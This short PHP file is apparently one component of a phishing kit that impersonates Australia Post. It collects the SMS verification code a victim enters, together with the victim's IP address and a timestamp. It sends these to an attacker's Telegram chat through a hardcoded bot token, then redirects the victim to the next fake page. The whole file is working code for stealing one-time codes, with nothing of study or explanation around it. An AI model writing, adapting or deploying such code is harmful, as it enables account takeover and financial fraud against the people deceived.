<?php

include("../anti/index.php");

$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");


if(($_POST['msg'] != ""))
	
	{	

$message .= "+❤️✉️✉️✉️SMS-POST AU✉️✉️✉️❤️+\n";
$message .= "* SMS CODE : ".$_POST['msg']."\n";

$message .= "* IP   : $ip\n";
$message .= "* date   : $date\n";
$message .= "+❤️✉️✉️✉️✉️✉️✉️✉️✉️✉️✉️❤️+\n";


        file_get_contents("https://api.telegram.org/bot7217034142:AAFTnwc5K2E2HJNFXJ9BWW_KBMrsahTlQ_4/sendMessage?chat_id=-4505093976&text=" . urlencode($message)."" );
        header("Location: ../xsms.php");
} else


header("Location: ../sms.php");



